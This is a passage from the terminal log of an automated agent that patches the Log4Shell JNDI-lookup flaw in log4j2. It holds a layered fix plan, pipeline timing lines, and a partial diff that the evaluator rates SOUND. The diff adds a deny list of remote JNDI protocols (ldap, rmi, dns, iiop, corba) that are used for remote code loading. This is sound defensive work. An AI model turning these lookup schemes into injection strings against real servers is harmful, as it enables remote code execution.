[2;36m                    [0m         [39m- Add static field initialized from PropertiesUtil:[0m                                 [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m  private static final boolean FORMAT_MESSAGES_NO_LOOKUPS = [0m                        [2m                [0m
[2;36m                    [0m         [39m      [0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.formatMsgNoLookups"[0m [2m                [0m
[2;36m                    [0m         [39m, false[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m- Modify line [0m[1;36m71[0m[39m-[0m[1;36m72[0m[39m to check this flag:[0m                                             [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m  [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && !FORMAT_MESSAGES_NO_LOOKUPS && [0m               [2m                [0m
[2;36m                    [0m         [1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m                                                             [2m                [0m
[2;36m                    [0m         [39m      [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [39m  ```[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale:** This provides a kill-switch to completely disable message [0m           [2m                [0m
[2;36m                    [0m         [39msubstitution for maximum security, while still allowing configuration-time [0m         [2m                [0m
[2;36m                    [0m         [39msubstitution to work. This addresses the core issue that message content [0m           [2m                [0m
[2;36m                    [0m         [1;39m([0m[39muser-controlled[0m[1;39m)[0m[39m should not undergo the same substitution as configuration [0m        [2m                [0m
[2;36m                    [0m         [1;39m([0m[39madmin-controlled[0m[1;39m)[0m[39m.[0m                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m3[0m[39m. Detailed Implementation Steps[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Step [0m[1;36m1[0m[39m: Update JndiLookup with URL Validation[0m                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mIn `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`:[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add import for PropertiesUtil at the top[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Replace the static ENABLE_JNDI declaration [0m[1;39m([0m[39mline [0m[1;36m31[0m[1;39m)[0m[39m with proper initialization [0m [2m                [0m
[2;36m                    [0m         [39musing static block[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Add a new private method `[0m[1;35misAllowedJndiProtocol[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m` to validate [0m   [2m                [0m
[2;36m                    [0m         [39mJNDI URLs[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. Update the `[0m[1;35mlookup[0m[1;39m([0m[1;39m)[0m[39m` method to call validation before performing lookup[0m         [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. Update `[0m[1;35mconvertJndiName[0m[1;39m([0m[1;39m)[0m[39m` to reject dangerous protocols[0m                         [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. Add logging for rejected attempts using StatusLogger[0m                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Key validation logic:**[0m                                                           [2m                [0m
[2;36m                    [0m         [39m- Allow: paths without [0m[32m"://"[0m[39m [0m[1;39m([0m[39mget jav[0m[1;92ma:c[0m[39momp/env/ prefix[0m[1;39m)[0m                            [2m                [0m
[2;36m                    [0m         [39m- Allow: paths starting with [0m[32m"java:"[0m                                                [2m                [0m
[2;36m                    [0m         [39m- Reject: paths containing [0m[32m"ldap://"[0m[39m, [0m[32m"ldaps://"[0m[39m, [0m[32m"rmi://"[0m[39m, [0m[32m"dns://"[0m[39m, [0m[32m"iiop://"[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [32m"corba://"[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m- Reject: any [0m[32m"://"[0m[39m that isn't [0m[32m"java:"[0m                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Step [0m[1;36m2[0m[39m: Update MessagePatternConverter with Disable Flag[0m                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mIn [0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.j[0m [2m                [0m
[2;36m                    [0m         [39mava`:[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add import for PropertiesUtil[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Add static field FORMAT_MESSAGES_NO_LOOKUPS initialized from system property[0m     [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Update the conditional in line [0m[1;36m71[0m[39m to check the flag[0m                              [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. Preserve the existing null checks and config checks[0m                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Step [0m[1;36m3[0m[39m: Add Configuration Constants[0m                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mIn `core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java`:[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add constant for the property name: `LOG4J_FORMAT_MSG_NO_LOOKUPS = [0m              [2m                [0m
[2;36m                    [0m         [32m"log4j2.formatMsgNoLookups"[0m[39m`[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Add constant for JNDI enable property: `LOG4J_ENABLE_JNDI_LOOKUP = [0m              [2m                [0m
[2;36m                    [0m         [32m"log4j2.enableJndiLookup"[0m[39m`[0m                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m4[0m[39m. Justification and Preservation of Existing Logic[0m                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Why this approach is optimal:**[0m                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Defense in depth**: Multiple independent layers mean vulnerability is [0m         [2m                [0m
[2;36m                    [0m         [39mmitigated even if one layer fails[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Secure by default**: JNDI disabled by default prevents exploitation in default[0m [2m                [0m
[2;36m                    [0m         [39mconfigurations[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Backward compatibility preserved**: [0m                                           [2m                [0m
[2;36m                    [0m         [39m   - Configuration-time substitution still works[0m                                    [2m                [0m
[2;36m                    [0m         [39m   - Users who need JNDI can enable it via system property[0m                          [2m                [0m
[2;36m                    [0m         [39m   - Existing legitimate JNDI usage [0m[1;39m([0m[39mlocal resources[0m[1;39m)[0m[39m continues to work[0m             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Minimal code changes**: No architectural changes, just additional validation [0m  [2m                [0m
[2;36m                    [0m         [39mand configuration[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **No test breakage**: [0m                                                           [2m                [0m
[2;36m                    [0m         [39m   - Existing JndiLookupTest uses local resources which pass validation[0m             [2m                [0m
[2;36m                    [0m         [39m   - Tests check ENABLE_JNDI flag before running [0m[1;39m([0m[39mline [0m[1;36m53[0m[39m-[0m[1;36m55[0m[1;39m)[0m                       [2m                [0m
[2;36m                    [0m         [39m   - Configuration tests use admin-controlled properties, not message substitution[0m  [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **Consistent with codebase patterns**: Uses existing PropertiesUtil, [0m            [2m                [0m
[2;36m                    [0m         [39mStatusLogger, and configuration patterns[0m                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**How it addresses the evaluation report:**[0m                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Blocks remote JNDI lookups**: Layer [0m[1;36m1[0m[39m URL validation prevents ldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, [0m [2m                [0m
[2;36m                    [0m         [39mdns:[0m[35m/[0m[35m/[0m[39m connections[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m- **Provides kill-switch**: Layer [0m[1;36m3[0m[39m allows complete disabling of message [0m           [2m                [0m
[2;36m                    [0m         [39msubstitution[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m- **Secure defaults**: Layer [0m[1;36m2[0m[39m requires explicit opt-in for JNDI functionality[0m      [2m                [0m
[2;36m                    [0m         [39m- **Preserves legitimate use**: Local J2EE container resources [0m[1;39m([0m[39mjav[0m[1;92ma:c[0m[39momp/env/*[0m[1;39m)[0m[39m [0m   [2m                [0m
[2;36m                    [0m         [39mstill work[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m- **Configurable**: System properties allow administrators to control behavior[0m      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Existing functionality preserved:**[0m                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- Configuration file substitution [0m[1;39m([0m[39m$[0m[1;39m{[0m[39msys:property[0m[1;39m}[0m[39m, $[0m[1;39m{[0m[39menv:VAR[0m[1;39m}[0m[1;39m)[0m[39m continues working[0m   [2m                [0m
[2;36m                    [0m         [39m- Local JNDI lookups for J2EE resources work when JNDI is enabled[0m                   [2m                [0m
[2;36m                    [0m         [39m- All safe lookup types [0m[1;39m([0m[39msys, env, date, ctx, map[0m[1;39m)[0m[39m unaffected[0m                       [2m                [0m
[2;36m                    [0m         [39m- Pattern layout and formatting logic unchanged[0m                                     [2m                [0m
[2;36m                    [0m         [39m- Plugin architecture and discovery mechanism intact[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Mitigation of potential side effects:**[0m                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Breaking legitimate JNDI usage**: Mitigated by allowing opt-in via system [0m     [2m                [0m
[2;36m                    [0m         [39mproperty[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Performance impact**: Minimal - only adds string validation checks[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Configuration complexity**: Simple boolean properties, well-documented[0m         [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Test failures**: [0m[3;35mNone[0m[39m expected - tests use local resources and check enable [0m   [2m                [0m
[2;36m                    [0m         [39mflag[0m                                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m5[0m[39m. Similar Solutions in Codebase[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis fix follows established patterns:[0m                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **PropertiesUtil usage**: Similar to Constants.LINE_SEP initialization [0m[1;39m([0m[39mline [0m[1;36m46[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Static initialization**: Similar to plugin manager initialization patterns[0m     [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Conditional features**: Similar to LiteralPatternConverter's substitute flag [0m  [2m                [0m
[2;36m                    [0m         [1;39m([0m[39mline [0m[1;36m46[0m[1;39m)[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Security validation**: Similar to cyclic substitution detection in [0m            [2m                [0m
[2;36m                    [0m         [39mStrSubstitutor[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Logging security events**: Consistent with existing error logging patterns[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m6[0m[39m. Implementation Priority[0m                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Critical**: JndiLookup URL validation [0m[1;39m([0m[39mLayer [0m[1;36m1[0m[1;39m)[0m[39m - directly blocks exploitation[0m [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Critical**: ENABLE_JNDI default to false [0m[1;39m([0m[39mLayer [0m[1;36m2[0m[1;39m)[0m[39m - prevents vulnerability in[0m [2m                [0m
[2;36m                    [0m         [39mdefault config[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **High**: Message lookup disable flag [0m[1;39m([0m[39mLayer [0m[1;36m3[0m[1;39m)[0m[39m - provides additional safety net[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAll three layers should be implemented together for comprehensive protection.[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mfix_strategy[0m[1m>[0m                                                                     [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
[2;36m[01/06/26 17:15:27][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.EVALUATE -> TeamStatus.ANALYZE                  ]8;id=459620;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=362902;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m2[0m, patch status: PatchStatus.UNCOMPILABLE[1m)[0m                                 [2m               [0m
[2;36m[01/06/26 17:19:20][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.ANALYZE -> TeamStatus.[1;33mPATCH[0m                     ]8;id=184101;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=723925;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m2[0m, patch status: PatchStatus.UNCOMPILABLE[1m)[0m                                 [2m               [0m
[2;36m[01/06/26 17:20:18][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.[1;33mPATCH[0m -> TeamStatus.EVALUATE                    ]8;id=934915;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=165870;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m2[0m, patch status: PatchStatus.UNCOMPILABLE[1m)[0m                                 [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=382598;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=834586;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:20:19][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m1.03[0m seconds;                ]8;id=795130;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=602151;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Started[33m...[0m                              ]8;id=762457;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=367234;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Checking valid diff: [35m/tmp/[0m[95mtmpf4kte2s7[0m                                                 ]8;id=427645;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py\[2mdefault.py[0m]8;;\[2m:[0m]8;id=394563;file:///home/qqor/crete/packages/crete/framework/environment/services/oss_fuzz/default.py#173\[2m173[0m]8;;\
[2;36m[01/06/26 17:21:02][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Patching[1m)[0m Took [1;36m43.25[0m seconds; [33mexception[0m=[3;91mFalse[0m    ]8;id=974572;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=13385;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Checking build[1m)[0m Started[33m...[0m                        ]8;id=446512;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=942812;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:21:11][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Checking build[1m)[0m Took [1;36m8.91[0m seconds;               ]8;id=971477;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=796750;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running PoV[1m)[0m Started[33m...[0m                           ]8;id=21327;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=750135;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:21:17][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Running PoV[1m)[0m Took [1;36m5.80[0m seconds; [33mexception[0m=[3;91mFalse[0m  ]8;id=890314;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=926641;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Testing[1m)[0m Started[33m...[0m                               ]8;id=662848;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=746126;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Testing[1m)[0m Took [1;36m0.00[0m seconds; [33mexception[0m=[3;91mFalse[0m      ]8;id=246100;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=121493;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=38648;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=982790;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:21:18][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.88[0m seconds;                ]8;id=429846;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=344190;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=457729;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=931589;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:21:19][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.90[0m seconds;                ]8;id=92369;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=450318;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m[01/06/26 17:21:20][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Started[33m...[0m                         ]8;id=885815;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=383237;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#9\[2m9[0m]8;;\
[2;36m[01/06/26 17:21:21][0m[2;36m [0m[34mINFO    [0m [1m[[0mlogging_performance[1m][0m[1m([0mlog4j2 Setting owner[1m)[0m Took [1;36m0.91[0m seconds;                ]8;id=477070;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py\[2mcontext_managers.py[0m]8;;\[2m:[0m]8;id=839313;file:///home/qqor/crete/packages/crete/commons/logging/context_managers.py#23\[2m23[0m]8;;\
[2;36m                    [0m         [33mexception[0m=[3;91mFalse[0m                                                               [2m                      [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m ===Evaluator [33mResult[0m===                                                              ]8;id=432320;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py\[2mevaluator.py[0m]8;;\[2m:[0m]8;id=652625;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py#204\[2m204[0m]8;;\
[2;36m                    [0m         PatchStatus.SOUND                                                                   [2m                [0m
[2;36m                    [0m         ===Evaluator [33mDiff[0m===                                                                [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         @@ [1;36m-19[0m,[1;36m8[0m +[1;36m19[0m,[1;36m11[0m @@                                                                  [2m                [0m
[2;36m                    [0m          import javax.naming.InitialContext;                                                [2m                [0m
[2;36m                    [0m          import javax.naming.NamingException;                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.Logger;                                            [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.LogEvent;                                     [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.config.plugins.Plugin;                        [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.status.StatusLogger;                               [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.util.PropertiesUtil;                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          [35m/[0m**                                                                                [2m                [0m
[2;36m                    [0m           * Looks up keys from JNDI resources.                                              [2m                [0m
[2;36m                    [0m         @@ [1;36m-28[0m,[1;36m7[0m +[1;36m31[0m,[1;36m15[0m @@                                                                  [2m                [0m
[2;36m                    [0m          @[1;35mPlugin[0m[1m([0mname = [32m"jndi"[0m, category = [32m"Lookup"[0m[1m)[0m                                        [2m                [0m
[2;36m                    [0m          public class JndiLookup implements StrLookup [1m{[0m                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         -    private static boolean ENABLE_JNDI = true;                                     [2m                [0m
[2;36m                    [0m         +    private static final Logger LOGGER = [1;35mStatusLogger.getLogger[0m[1m([0m[1m)[0m;                 [2m                [0m
[2;36m                    [0m         +    private static boolean ENABLE_JNDI;                                            [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    static [1m{[0m                                                                       [2m                [0m
[2;36m                    [0m         +        ENABLE_JNDI =                                                              [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getBooleanProperty[0m[1m([0m[32m"log4j2.enableJndiLookup"[0m,        [2m                [0m
[2;36m                    [0m         false[1m)[0m;                                                                             [2m                [0m
[2;36m                    [0m         +        if [1m([0mENABLE_JNDI[1m)[0m [1m{[0m                                                         [2m                [0m
[2;36m                    [0m         +            [1;35mLOGGER.warn[0m[1m([0m[32m"JNDI lookup is enabled. This can pose a security risk. [0m   [2m                [0m
[2;36m                    [0m         [32mSet log4j2.[0m[32menableJndiLookup[0m[32m=[0m[32mfalse[0m[32m to disable."[0m[1m)[0m;                                    [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +    [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m** JNDI resourcce path prefix used in a J2EE container *[35m/[0m                     [2m                [0m
[2;36m                    [0m              static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [32m"java:comp/env/"[0m;    [2m                [0m
[2;36m                    [0m         @@ [1;36m-55[0m,[1;36m12[0m +[1;36m66[0m,[1;36m49[0m @@                                                                 [2m                [0m
[2;36m                    [0m                      return null;                                                           [2m                [0m
[2;36m                    [0m                  [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         +        if [1m([0m![1;35misAllowedJndiProtocol[0m[1m([0mkey[1m)[0m[1m)[0m [1m{[0m                                         [2m                [0m
[2;36m                    [0m         +            [1;35mLOGGER.warn[0m[1m([0m[32m"Rejected JNDI lookup with potentially unsafe protocol: [0m   [2m                [0m
[2;36m                    [0m         [32m{[0m[32m}[0m[32m"[0m, key[1m)[0m;                                                                          [2m                [0m
[2;36m                    [0m         +            return null;                                                           [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m                  try [1m{[0m                                                                      [2m                [0m
[2;36m                    [0m                      InitialContext ctx = new [1;35mInitialContext[0m[1m([0m[1m)[0m;                             [2m                [0m
[2;36m                    [0m                      return [1m([0mString[1m)[0m [1;35mctx.lookup[0m[1m([0m[1;35mconvertJndiName[0m[1m([0mkey[1m)[0m[1m)[0m;                      [2m                [0m
[2;36m                    [0m                  [1m}[0m catch [1m([0mNamingException e[1m)[0m [1m{[0m                                              [2m                [0m
[2;36m                    [0m                      return null;                                                           [2m                [0m
[2;36m                    [0m                  [1m}[0m                                                                          [2m                [0m
[2;36m                    [0m         +    [1m}[0m                                                                              [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * Validates that the JNDI name uses only allowed protocols [1m([0mlocal java:       [2m                [0m
[2;36m                    [0m         scheme[1m)[0m.                                                                            [2m                [0m
[2;36m                    [0m         +     * Rejects remote protocols like ldap:[35m/[0m[35m/[0m, ldaps:[35m/[0m[35m/[0m, rmi:[35m/[0m[35m/[0m, dns:[35m/[0m[35m/[0m, iiop:[35m/[0m[35m/[0m,   [2m                [0m
[2;36m                    [0m         corba:[35m/[0m[35m/[0m[95m.[0m                                                                           [2m                [0m
[2;36m                    [0m         +     *                                                                             [2m                [0m
[2;36m                    [0m         +     * @param jndiName The JNDI name to validate                                   [2m                [0m
[2;36m                    [0m         +     * @return true if the protocol is allowed, false otherwise                    [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    private boolean [1;35misAllowedJndiProtocol[0m[1m([0mfinal String jndiName[1m)[0m [1m{[0m                 [2m                [0m
[2;36m                    [0m         +        if [1m([0mjndiName == null[1m)[0m [1m{[0m                                                    [2m                [0m
[2;36m                    [0m         +            return false;                                                          [2m                [0m
[2;36m                    [0m         +        [1m}[0m                                                                          [2m                [0m
